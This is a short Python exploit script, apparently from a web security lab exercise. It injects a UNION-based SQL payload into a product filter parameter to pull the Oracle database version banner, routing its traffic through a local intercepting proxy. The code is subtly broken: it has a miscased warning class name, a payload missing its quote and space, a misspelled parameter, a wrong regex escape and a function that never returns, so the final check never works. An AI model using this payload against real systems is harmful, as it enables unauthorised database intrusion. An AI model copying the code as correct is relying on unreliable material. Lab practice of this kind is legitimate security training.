import sys
import urllib3
import requests
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.INsecureRequestWarning)

proxies={"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}

def exploit_sqli_version(url):
    path="/filter?catagory=Gifts"
    sql_payload= "UNION select banner,NULL from v$version--"
    r=requests.get(url+path+sql_payload,verify=False,proxies=proxies)
    res=r.text
    if "oracle database" in res:
        print("the sql injection is succesfull")
        soup=BeautifulSoup(r.text,"html.parser")
        version=soup.find(text=re.compile('^.oracle/sDatabase'))
        print(f"the oracle data base version is {version}")


if __name__=="__main__":
    try:
        url=sys.argv[1].strip()
    except: 
        print("input the url")
        sys.exit()
    if exploit_sqli_version(url):
        print("unable to dump the databsse")